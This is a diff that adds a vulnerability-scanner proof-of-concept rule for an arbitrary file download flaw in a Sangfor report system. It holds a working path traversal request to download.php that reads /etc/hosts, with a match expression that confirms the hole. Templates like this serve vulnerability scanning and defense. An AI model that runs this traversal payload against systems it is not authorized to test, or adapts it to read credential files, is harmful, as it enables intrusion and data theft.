@@ -1,0 +1,13 @@
+name: poc-yaml-sangfor-ad-download.php-filedownload
+rules:
+  - method: GET
+    path: /report/download.php?pdf=../../../../../etc/hosts
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b'localhost') && response.headers['Content-Disposition'].contains('hosts')
+
+detail:
+  author: PeiQi0
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: sangfor,file,download
